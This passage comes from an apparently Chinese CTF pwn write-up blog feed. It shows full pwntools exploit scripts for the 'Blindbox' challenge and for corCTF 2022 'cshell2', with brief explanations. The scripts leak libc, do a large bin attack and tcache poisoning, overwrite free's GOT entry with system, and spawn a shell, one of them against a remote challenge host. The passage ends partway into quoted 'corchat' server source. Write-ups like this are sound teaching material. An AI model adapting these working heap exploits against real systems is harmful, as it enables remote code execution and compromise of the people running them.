class="hljs-number">2</span>,p64(fake_heap-<span class="hljs-number">0x10</span>)+p16(n))<br><br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment">#pause()</span><br>    fake_IO=p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p16(n+<span class="hljs-number">8</span>)<br><br>    make(fake_IO)<br><br>    d=u64(p.read(<span class="hljs-number">8</span>))<br>    <span class="hljs-keyword">if</span> d&gt;&gt;<span class="hljs-number">40</span> &lt;<span class="hljs-number">0x7f</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-number">123</span>)<br>        <span class="hljs-keyword">return</span><br>    libc.address=d-libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>    system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    pay(system)<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./Blindbox&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    p.close()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第三种方法</span><br><span class="hljs-string">   程序在输出chunk时，仅检测了chunk的fd字段处是否存在值为0x7f的字节，</span><br><span class="hljs-string">                   并未检测是否存在值为0x7e的字节</span><br><span class="hljs-string">   而在某些情况下libc的地址就在0x7exxxxxxxxxx处，</span><br><span class="hljs-string">   通过多次尝试，只要libc基地址在0x7exxxxxxxxxx处就可以获取shell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">s,i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(s))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1-3): &#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;drop?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">i</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;open?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&#x27;Blindbox: &#x27;</span>,timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">return</span> u64(p.read(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">i,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;wish: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pay</span>(<span class="hljs-params">system</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1804289383</span>, <span class="hljs-number">846930886</span>, <span class="hljs-number">1681692777</span>, <span class="hljs-number">1714636915</span>, <span class="hljs-number">1957747793</span>, <span class="hljs-number">424238335</span>, <span class="hljs-number">719885386</span>, <span class="hljs-number">1649760492</span>]:<br>        p.sendlineafter(<span class="hljs-string">&#x27;guess&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i^system))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    fake_heap=<span class="hljs-number">0x66666000</span>   <br>    libc=ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,p64(<span class="hljs-number">0</span>)+p64(fake_heap-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb8</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x158</span>))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">1</span>)<br>    d=show(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> ((d&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span>) != <span class="hljs-number">0x7e</span>:<br>        <span class="hljs-keyword">return</span><br>    d=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>    libc.address=d-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    pay(system)<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./Blindbox&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 corctf-pwn</title>
    <link href="/page/wp/corctf-pwn/"/>
    <url>/page/wp/corctf-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="cshell2">cshell2</h2><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-1.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-2.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-3.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-4.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-5.jpg" srcset="/img/loading.gif" lazyload alt="change_age函数代码" title="change_age函数代码"></p><p>在<code>create</code>,<code>show</code>,<code>delete</code>,<code>edit</code>函数中都检测了<code>chunk</code>数组中对应的<code>chunk</code>的<code>size</code>是否为<code>0</code>，这表示在正常情况下，如果<code>chunk</code>被释放了之后，就无法使用<code>show</code>,<code>delete</code>,<code>edit</code>函数，对那个<code>chunk</code>进行操作，但<code>change_age</code>函数可以修改被释放的<code>chunk</code>的<code>bk_nextsize</code>字段<br><code>create</code>只允许创建大于等于<code>0x408</code>大小的<code>chunk</code>，也就是说只能创建能放入<code>large bin</code>中的<code>chunk</code>，但其中<code>0x410</code>大小的<code>chunk</code>，会优先放入<code>tcache bin</code>中</p><p>所以这题有两个思路</p><ul><li>利用large bin attack修改IO结构体的vtable字段，使程序在进行io操作时执行后门指令</li><li>利用large bin attack修改heap_array中某个成员的size，如果这个成员恰好在tcache bin中，那么就可以修改tcache bin的结构，达到任意地址读写</li></ul><p><img src="/img/blog_img/corctf/corctf-pwn-cshell2-6.jpg" srcset="/img/loading.gif" lazyload alt=""></p><blockquote><p>使用one_gadget获取地址报错，所以第一种方法暂时无法利用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;第二种方法</span><br><span class="hljs-string"> 将got表中的地址放入tcache bin中，修改got表中free项地址为system</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=[<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27; &#x27;</span>]</span>):<br>    fn=data[<span class="hljs-number">0</span>]<br>    mn=data[<span class="hljs-number">1</span>]<br>    ln=data[<span class="hljs-number">2</span>]<br>    age=data[<span class="hljs-number">3</span>]<br>    bio=data[<span class="hljs-number">4</span>]<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size (1032 minimum): &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;firstname: &#x27;</span>,fn)<br>    p.sendafter(<span class="hljs-string">&#x27;middlename: &#x27;</span>,mn)<br>    p.sendafter(<span class="hljs-string">&#x27;lastname: &#x27;</span>,ln)<br>    p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>,<span class="hljs-built_in">str</span>(age))<br>    p.sendafter(<span class="hljs-string">&#x27;bio: &#x27;</span>,bio)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.readuntil(<span class="hljs-string">&#x27;last: &#x27;</span>)<br>    ln=p.readuntil(<span class="hljs-string">&#x27; first: &#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    fn=p.readuntil(<span class="hljs-string">&#x27; middle: &#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    mn=p.readuntil(<span class="hljs-string">&#x27; age: &#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    age=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\nbio: &#x27;</span>,drop=<span class="hljs-number">1</span>))<br>    bio=p.readuntil(<span class="hljs-string">&#x27;1 Add&#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> [fn,mn,ln,age,bio]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    fn=data[<span class="hljs-number">0</span>]<br>    mn=data[<span class="hljs-number">1</span>]<br>    ln=data[<span class="hljs-number">2</span>]<br>    age=data[<span class="hljs-number">3</span>]<br>    bio=data[<span class="hljs-number">4</span>]<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;firstname: &#x27;</span>,fn)<br>    p.sendafter(<span class="hljs-string">&#x27;middlename: &#x27;</span>,mn)<br>    p.sendafter(<span class="hljs-string">&#x27;lastname: &#x27;</span>,ln)<br>    p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>,<span class="hljs-built_in">str</span>(age))<br>    p.sendafter(<span class="hljs-string">&#x27;bio: &#x27;</span>,bio)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">ind,age</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>,<span class="hljs-built_in">str</span>(age))<br><br>e=ELF(<span class="hljs-string">&#x27;./cshell2&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>ld=ELF(<span class="hljs-string">&#x27;./ld.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>heap_array=<span class="hljs-number">0x4040c0</span><br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>p=remote(<span class="hljs-string">&#x27;be.ax 31667&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x408</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">0xa</span>,<span class="hljs-number">0x408</span>)<br>add(<span class="hljs-number">0xb</span>,<span class="hljs-number">0x408</span>,[<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27; &#x27;</span>])<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x428</span>)<br><br>d=show(<span class="hljs-number">0</span>)<br>d1=u64(d[<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap_addr=d1&amp;<span class="hljs-number">0xfffffffffffff000</span><br><br>d0=u64(d[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d0))<br>libc.address=(d0&amp;<span class="hljs-number">0xffffffffffffff00</span>)-((libc.sym[<span class="hljs-string">&#x27;_IO_wide_data_0&#x27;</span>]+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">224</span>)&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>free_f=libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>puts=libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>fail=libc.sym[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>]<br>printf=libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>malloc=libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>setvbuf=libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>]<br>scanf=libc.sym[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br>free(<span class="hljs-number">0xa</span>)<br><br>free(<span class="hljs-number">1</span>)<br><br>heap_array_1=heap_array+<span class="hljs-number">0x10</span><br>heap_array_1_size=heap_array_1+<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_array_1_size))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x450</span>)<br><br>change(<span class="hljs-number">2</span>,heap_array_1_size-<span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x450</span>)<br>heap_0=heap_addr+<span class="hljs-number">0x290</span><br>heap_1=heap_0+<span class="hljs-number">0x420</span><br>heap_1_fd=heap_1+<span class="hljs-number">0x10</span><br><br>edit(<span class="hljs-number">1</span>,[p64((free_got-<span class="hljs-number">0x8</span>)^(heap_1_fd&gt;&gt;<span class="hljs-number">12</span>)),<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27; &#x27;</span>])<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x408</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x408</span>,[p64(system),p64(system),p64(puts),fail,p64(scanf)])<br>free(<span class="hljs-number">0xb</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="corchat">corchat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">ChatServer::RecvCrusaderMessages</span><span class="hljs-params">(<span class="hljs-type">void</span> *context)</span><br>&#123;<br>    ChatServer *ctx = (ChatServer *)context;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-built_in">strlen</span>(COR_MSG_TYPES[<span class="hljs-number">0</span>]) + <span class="hljs-number">1</span>];<br>    Crusader *cur_crusader;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ctx-&gt;m_connected_crusaders == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int8_t</span> crusader_idx = <span class="hljs-number">0</span>; crusader_idx &lt; MAX_CRUSADERS; crusader_idx++)<br>        &#123;<br>            cur_crusader = ctx-&gt;m_crusader_seats[crusader_idx];<br>            <span class="hljs-keyword">if</span> (cur_crusader == nullptr)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (cur_crusader-&gt;Recv(buffer, <span class="hljs-built_in">strlen</span>(COR_MSG_TYPES[<span class="hljs-number">0</span>])) == <span class="hljs-literal">false</span>)<br>            &#123;<br>                delete cur_crusader;<br>                ctx-&gt;m_crusader_seats[crusader_idx] = nullptr;<br>                ctx-&gt;m_connected_crusaders--;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;SET_UNAME&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                msg = cur_crusader-&gt;RecvUname();<br>                <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&quot;&quot;</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>                cur_crusader-&gt;SetUname(msg.c_str(), msg.length());<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;GETSTATUS&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; cur_crusader-&gt;is_admin == <span class="hljs-literal">true</span>)<br>            &#123;<br>                <span class="hljs-comment">/* 控制程序流时需要将返回地址修改为 call DoAdmin 指令的地址 */</span><br>                DoAdmin(<span class="hljs-string">&quot;top -n 1&quot;</span>, cur_crusader-&gt;m_sock_fd);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;_SEND_MSG&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                msg = cur_crusader-&gt;RecvMessage();<br>                <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&quot;&quot;</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span> (ctx-&gt;m_connected_crusaders &gt; <span class="hljs-number">1</span>)<br>                    ctx-&gt;BroadcastMsg(cur_crusader, msg.c_str(), msg.length(), <span class="hljs-literal">true</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;GET_UNAME&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> response = <span class="hljs-string">&quot;You are known as &quot;</span> + cur_crusader-&gt;GetUname() + <span class="hljs-string">&quot;\n&quot;</span>;<br>                cur_crusader-&gt;SendMsg(response.c_str(), response.length(), <span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>    <span 